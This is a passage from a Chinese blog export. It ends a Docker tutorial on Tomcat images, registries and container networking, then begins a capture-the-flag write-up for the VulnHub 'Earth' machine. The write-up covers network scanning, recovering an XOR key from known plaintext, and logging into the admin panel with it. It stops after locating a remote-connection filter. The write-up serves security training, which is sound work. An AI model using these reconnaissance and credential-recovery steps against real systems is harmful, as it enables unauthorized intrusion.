<code>Dockerfile</code>，这是官方命名，如果是这个命名，那么在 build
的时候就不用 <code>-f</code>。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> takagi&lt;hongdf1998@gmail.com&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> readme /usr/<span class="built_in">local</span>/readme</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> jdk-8u271-linux-x64.tar.gz /usr/<span class="built_in">local</span></span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> apache-tomcat-9.0.73.tar.gz /usr/<span class="built_in">local</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum -y install vim</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> MYPATH /usr/local</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> <span class="variable">$MYPATH</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> JAVA_HOME /usr/local/jdk1.<span class="number">8.0</span>_271</span><br><span class="line"><span class="keyword">ENV</span> CLASS_PATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line"><span class="keyword">ENV</span> CATALINA_HOME /usr/local/apache-tomcat-<span class="number">9.0</span>.<span class="number">73</span></span><br><span class="line"><span class="keyword">ENV</span> CATALINA_BASH /usr/local/apache-tomcat-<span class="number">9.0</span>.<span class="number">73</span></span><br><span class="line"><span class="keyword">ENV</span> PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /usr/<span class="built_in">local</span>/apache-tomcat-9.0.73/bin/startup.sh &amp;&amp; tail -F /usr/<span class="built_in">local</span>/apache-tomcat-9.0.73/logs/catalina.out</span></span><br></pre></td></tr></table></figure>
<p>需要注意几点：</p>
<ol type="1">
<li><code>ADD</code> 会自动解压；</li>
<li>后面连续 5 个 ENV 是 java 和 apache
环境配置，可以照抄，抄的时候要注意自己的目录名称，如果不确定，可以将第一步准备的压缩包解压看一下；</li>
</ol>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402104352.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<blockquote>
<p>这里的 <code>test</code> 和 <code>logs</code>
是启动容器后生成的，这里应该没有，我是做完回来记录的</p>
</blockquote>
<p><strong>第三步，构建镜像</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402104459.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p><strong>第四步，启动并访问容器</strong></p>
<p>启动命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 3377:8080 --name takagitomcat -v /home/kali/mydiytomcat/<span class="built_in">test</span>:/usr/<span class="built_in">local</span>/apache-tomcat-9.0.73/webapps/<span class="built_in">test</span> -v /home/kali/mydiytomcat/logs:/usr/<span class="built_in">local</span>/apache-tomcat-9.0.73/logs mydiytomcat</span><br></pre></td></tr></table></figure>
<p>这里将容器的两个目录与宿主机挂载。访问
<code>localhost:3377</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402104615.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p><strong>第五步，访问测试（一下操作都在宿主机）</strong></p>
<p>在 <code>/home/kali/mydiytomcat/test</code> 下创建目录
<code>WEB-INF</code>，在这个目录下创建一个文件
<code>web.xml</code>，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">        xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot;</span><br><span class="line">        xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee</span><br><span class="line">        http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;</span><br><span class="line">        id=&quot;WebApp_ID&quot; version=&quot;2.5&quot;&gt;</span><br><span class="line">&lt;display-name&gt;test&lt;/display-name&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
<p>在 <code>/home/kali/mydiytomcat/test</code> 目录下创建文件
<code>index.jsp</code>，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;</span><br><span class="line">pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">                &lt;title&gt;hello,takagi&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">                Hello World!&lt;br/&gt;</span><br><span class="line">                &lt;%</span><br><span class="line">                System.out.println(&quot;----my web test----&quot;);</span><br><span class="line">                %&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>然后访问 <code>localhost:3377/test/index.jsp</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402110252.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>成功访问。没访问一次，就会在
<code>/home/kali/mydiytomcat/logs/catalina.out</code> 中追加打印一行内容
<code>----my web test----</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402110420.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h2 id="发布镜像">7.7. 发布镜像</h2>
<p>目的：将上一节创建的 tomcat 镜像发布到仓库。</p>
<p>需要注意，推送镜像是有规范的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker push 注册用户名/镜像名[:tag]</span><br></pre></td></tr></table></figure>
<p>我们在本地可能就比较随意，叫做
`mydiytomcat:1.0，如果直接发布则会报错：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402112232.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>所以需要使用 <code>docker tag</code> 命令修改镜像名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag 原理镜像名 注册用户名/镜像名[:tag]</span><br></pre></td></tr></table></figure>
<p>然后再上传即可，最好带上 tag 用来说明版本号。</p>
<h3 id="发布到-docker-hub">7.7.1. 发布到 docker hub</h3>
<p>Docker hub
在外网，需要挂代理，否则可能上传失败。需要有一个能够登录的账号，可以注册一个。</p>
<p>第一步，登录 docker hub：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker login -u 用户名</span><br></pre></td></tr></table></figure>
<p>第二步，将镜像名修改为规范的样子</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag mydiytomcat takag1/tomcat:1.0</span><br></pre></td></tr></table></figure>
<p>第三步，挂代理：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. <span class="built_in">export</span> http_proxy=http://10.198.49.193:7890</span><br><span class="line">2. <span class="built_in">export</span> https_proxy=http://10.198.49.193:7890</span><br></pre></td></tr></table></figure>
<p>第四步，发布：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker push takag1/tomcat:1.0 </span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402112818.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>最后，登录 docker hub 查看自己的仓库，可以看到多了一个项目。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402113101.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<blockquote>
<p>（一、二、三顺序无所谓，只要四在最后就行）</p>
</blockquote>
<h3 id="发布到阿里云镜像服务">7.7.2. 发布到阿里云镜像服务</h3>
<p>前期准备：</p>
<p>1、创建个人实例：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402113636.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>2、创建镜像仓库</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402113756.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402113912.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>3、创建镜像仓库之后，会出现操作指南，跟着做就行</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402114135.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402114206.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>4、发布成功后就可以在镜像版本中看到详细信息</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402114329.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>其中 <strong>层信息</strong>
就是在构建镜像过程中一层一层执行的情况。</p>
<h2 id="docker-所有流程小结">7.8. Docker 所有流程小结</h2>
<p>[[docker入门_流程jpg.jpg]]</p>
<p>上图就是 docker 的整体流程，这里介绍一下最后一部分，就是
<code>docker save</code> 和 <code>docker load</code></p>
<ul>
<li><code>docker save</code>：将镜像压缩；</li>
<li><code>docker load</code>：将压缩包加载；</li>
</ul>
<p>命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker save -o 保存路径 镜像</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402115839.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker load -i 压缩包</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402120119.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h1 id="docker-网络">8. Docker 网络</h1>
<blockquote>
<p>Docker 网络使用的是 <code>veth-pair</code>
技术：[[veth-pair技术]]，不懂也没事，接着看</p>
</blockquote>
<h2 id="理解-docker0">8.1. 理解 <code>docker0</code></h2>
<p>清空所有的镜像和容器，使用 <code>ip addr</code> 查看当前 Linux
的所有网卡：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402130811.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<ul>
<li><code>lo</code>：是回环地址；</li>
<li><code>eth0</code> 和 <code>eth1</code> 是 VMWare
配置了两张虚拟网卡；</li>
<li><code>docker0</code> 就是 docker 安装时配置的虚拟网卡；</li>
</ul>
<p>我们先启动一个容器，然后再次查看 Linux 所有网卡
<code>docker run -d -P --name tomcat1 tomcat</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402132556.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>可以发现，现在多了一张网卡，我们进入 docker
容器内部，看一下容器的网卡。这里可能出现容器没有 <code>ip addr</code> 和
<code>ifconfig</code> 命令，可以进入容器执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install -y iproute2</span><br></pre></td></tr></table></figure>
<p>之后就可以执行 <code>ip addr</code> 了，<code>ifconfig</code> 在
<code>net-tools</code> 里面，<code>ping</code> 命令在
<code>iputils-ping</code> 中。或者使用镜像
<code>tomcat:7.0</code>，带有这些命令。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402132456.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>并且：</p>
<ul>
<li>宿主机上：<code>174: veth5a7eb5d@if173</code>；</li>
<li>容器：<code>173: eth0@if174</code>；</li>
</ul>
<p>画出网络拓扑图如下：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402132850.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>容器与宿主机通过 veth-pari 技术实现了通信，因此宿主机能够 ping
通容器，容器也能够 ping 通宿主机。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402132952.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>我们再开启一个容器：<code>docker run -d -P --name tomcat2 tomcat</code>，会发现又多了一张网卡，这张网卡就是
tomcat 2 的：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402133057.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>此时拓扑图如下：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402133140.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>简单来说，<code>docker0</code> 就像是交换机，而 <code>tomcat1</code>
和 <code>tomcat2</code>
就是接在交换机上的两个设备，它们在同一网络内，所以能够彼此 ping 通。</p>
<p><code>tomcat2</code> 的网卡情况：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402134106.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p><code>ping</code> 结果：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402134057.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p><strong>小结</strong>：</p>
<p>Docker 使用 Linux 桥接，在宿主机虚拟一个 Docker 容器网桥
(docker0)，Docker 启动一个容器时会根据 Docker 网桥的网段分配给容器一个
IP 地址，称为 Container-IP，同时 Docker
网桥是每个容器的默认网关。因为在同一宿主机内的容器都接入同一个网桥，这样容器之间就能够通过容器的
Container-IP 直接通信。</p>
<p>如果在启动容器时不指定网络，默认就是 <code>docker0</code>。</p>
<p>[[docker入门_网络拓扑.jpg]]</p>
<p>可以使用 <code>docker network</code> 查看 docker 的网络情况：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402135242.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>用 <code>docker netword inspect netword_id</code>
可以看某个网络的详细信息：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402135337.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h2 id="容器互联">8.2. 容器互联</h2>
<p>这样也会有一个麻烦的点，那就是没启动一个容器，都需要知道容器的
IP，然后写到项目里面，一旦容器重启，ip
改变，又得修改，很麻烦，有没有办法实现通过容器的名字就能够通信。比如
<code>ping tomcat2</code> 就可以。</p>
<p>通过 <code>--link</code> 可以实现，我们启动
<code>tomcat3</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -P --name tomcat3 --link tomcat2 tomcat</span><br></pre></td></tr></table></figure>
<p>进入 <code>tomcat3</code>，尝试使用 <code>ping tomcat2</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402140440.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>发现可以使用容器名 ping 通，我们再尝试在 <code>tomcat2</code>
中使用容器名去 ping <code>tomcat3</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402140522.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>发现是不行的，这是为什么呢？原理很简单，可以查看 <code>tomcat3</code>
的 <code>/etc/hosts</code> 文件：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402140605.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>实际上 <code>--link</code> 就是将 <code>tomcat2</code> 的容器名和 IP
写入到 <code>/etc/hosts</code> 里面，所以就能够通过容器名解析到 IP。</p>
<blockquote>
<p>现在不建议使用 <code>--link</code></p>
</blockquote>
<h2 id="自定义网络">8.3. 自定义网络</h2>
<blockquote>
<p>网络连接方式：[[网络连接方式]]</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402141042.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>网络模式：</p>
<ul>
<li>bridge：桥接 docker（默认，自己创建也使用 bridge 桥接模式）<br />
</li>
<li>none：不配置网络<br />
</li>
<li>host：和主机共享网络<br />
</li>
<li>container：容器网络连通！（用的少！局限很大）</li>
</ul>
<p>下面两条命令是一样的效果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -P --name tomcat1 tomcat</span><br><span class="line">docker run -d -P --name tomcat1 --net bridge tomcat</span><br></pre></td></tr></table></figure>
<p><code>docker0</code> 默认不支持通过容器名 ping
通，但自己创建的网络可以。使用命令 <code>docker network create</code>
可以创建网络，需要提供：</p>
<ul>
<li><code>driver</code></li>
<li><code>subnet</code></li>
<li><code>gateway</code></li>
</ul>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402141932.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>使用命令创建名为 <code>mynet</code> 的网络：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network create --driver bridge --subnet 192.168.0.0/24 --gateway 192.168.0.1 mynet</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402142040.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>（先把容器和镜像都删了）接下来，启用两台容器，检测是否可以使用容器名
ping 通：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. docker run -d -P --name tomcat1 --net mynet tomcat:7.0</span><br><span class="line">2. docker run -d -P --name tomcat2 --net mynet tomcat:7.0</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402142423.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>结果是可以的。</p>
<p>自定义网络的使用场景，假设有多台 mysql 和多台
tomcat，不希望它们在同一个网络下，可以通过这样实现，不同的集群使用不同的网络，保证集群的安全：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402142704.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>问题：</p>
<ul>
<li>那这两个网络能否联通呢？</li>
</ul>
<h2 id="网络联通">8.4. 网络联通</h2>
<p>假设这样的网络拓扑：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402143503.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>能否让 <code>tomcat3</code> ping 通
<code>tomcat1</code>？答案是不能的，这是两个网络，<code>tomcat3</code>
的流量到达不了 <code>tomcat1</code>，现在理论上有两种方式：</p>
<ol type="1">
<li>第一种，将 <code>docker0</code> 和 <code>mynet</code>
连接；这样是行不通的，也没有意义，把两个网络联通，那为什么要创建两个网络呢？</li>
<li>第二种，单独将 <code>tomcat3</code> 连接到
<code>mynet</code>；这是可行的，相当于在 <code>tomcat3</code>
上多装了一个网卡；</li>
</ol>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402144043.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>第二种实现可以通过 <code>docker network connect</code> 命令实现。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network connect mynet tomcat3</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402144136.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>此时可以查看 <code>mynet</code> 网络，多了一个
<code>tomcat3</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402144220.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>让 <code>tomcat3</code> 执行 <code>ip addr</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230402144257.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>发现其有两张网卡，一张连接 <code>mynet</code>，一张连接
<code>docker0</code>。</p>
<h1 id="其他内容">9. 其他内容</h1>
<p>后面谈到了 <code>Redis</code> 集群部署和 <code>SpringBoot</code>
微服务打包镜像我没有看，主要是不懂。</p>
<p>还有一个视频 <a
href="https://www.bilibili.com/video/BV1kv411q7Qc/?vd_source=c3b0b6208defe5707a75f328be65ce16">【狂神说Java】Docker进阶篇超详细版教程通俗易懂_哔哩哔哩_bilibili</a>
也还没看，这些内容目前还用不到。</p>
]]></content>
      <categories>
        <category>docker</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>入门</tag>
      </tags>
  </entry>
  <entry>
    <title>Earth Writeup</title>
    <url>/2022/05/17/Earth%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度适中。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/the-planets-earth,755/">The
Planets: Earth ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.50</span><br><span class="line">3. sudo nmap -p22,80,443 -A 10.0.2.50</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517203004.png" /></p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p>首先，根据扫描结果，先将两个域名<code>earth.local</code>和<code>terratest.earth.local</code>加入/etc/hosts。</p>
<p>依次访问了80端口和443端口（443端口需要在前面假设https），但是页面都是一样的。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517230957.png" /></p>
<p>并且存在三行 Previous Messages: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Previous Messages:</span><br><span class="line"></span><br><span class="line">37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</span><br><span class="line"></span><br><span class="line">3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</span><br><span class="line"></span><br><span class="line">2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</span><br></pre></td></tr></table></figure></p>
<p>暂时不知道有什么用，那就访问下一个域名</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517231103.png" /></p>
<p>对两个域名都进行路径扫描，发现结果一样，得到一个登录界面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517231347.png" /></p>
<p>但是，terratest.earth.local有robots.txt，而另一个域名没有。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517231430.png" /></p>
<p>注意最后一个 testingnotes.* ，经过测试，发现后缀是
txt，访问得到下面的内容： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/testingnotes.txt</span><br><span class="line"></span><br><span class="line">Testing secure messaging system notes:</span><br><span class="line">*Using XOR encryption as the algorithm, should be safe as used in RSA.</span><br><span class="line">*Earth has confirmed they have received our sent messages.</span><br><span class="line">*testdata.txt was used to test encryption.</span><br><span class="line">*terra used as username for admin portal.</span><br><span class="line">Todo:</span><br><span class="line">*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span><br><span class="line">*Need to test different key lengths to protect against bruteforce. How long should the key be?</span><br><span class="line">*Need to improve the interface of the messaging interface and the admin panel, it&#x27;s currently very basic.</span><br></pre></td></tr></table></figure></p>
<p>从中得到以下信息：</p>
<ol type="1">
<li>加密方式是异或；</li>
<li>存在一个testdata.txt文件</li>
<li>登录界面的用户名为 terra</li>
</ol>
<p>访问testdata.txt文件 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/testdata.txt</span><br><span class="line"></span><br><span class="line">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure></p>
<p>根据猜测，testdata.txt的内容经过某个message
key异或之后，得到的就是previous
messages中最长的一条（最后一条），可以测试的，将testdata.txt的内容复制到message，然后message
key随便写，得到的长度和最后一条previous message一样。</p>
<p>那么公式就是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">real_message = message ^ message key</span><br></pre></td></tr></table></figure></p>
<p>我们已经知道了real_message和message，现在可以得到message
key。我直接放入cyberchef中</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517232220.png" /></p>
<p>整理后如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">earthclimatechangebad4humans</span><br><span class="line">earthclimatechangebad4humans</span><br><span class="line">earthclimatechangebad4humans</span><br><span class="line">earthclimatechangebad4humans</span><br><span class="line">earthclimatechangebad4humans</span><br><span class="line">earthclimatechangebad4humans</span><br><span class="line">earthclimatechangebad4humans</span><br><span class="line">earthclimatechangebad4humans</span><br><span class="line">earthclimatechangebad4humans</span><br><span class="line">earthclimatechangebad4humans</span><br><span class="line">earthclimatechangebad4humans</span><br><span class="line">earthclimatechangebad4humans</span><br><span class="line">earthclimatechangebad4humans</span><br><span class="line">earthclimatechangebad4humans</span><br><span class="line">earthclimat</span><br></pre></td></tr></table></figure></p>
<p>利用 earthclimatechangebad4humans 成功登录后台</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517232301.png" /></p>
<p>这里其实可以使用下面命令查看是哪个文件进行了过滤。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name &quot;*.py&quot; -type f | xargs grep &quot;Remote connections are forbidden&quot;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518211043.png" /></p>
<p>然后查看该文件的内容： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/earth_web/secure_message/forms.py</span><br></pre></td></tr></table></figure></p>
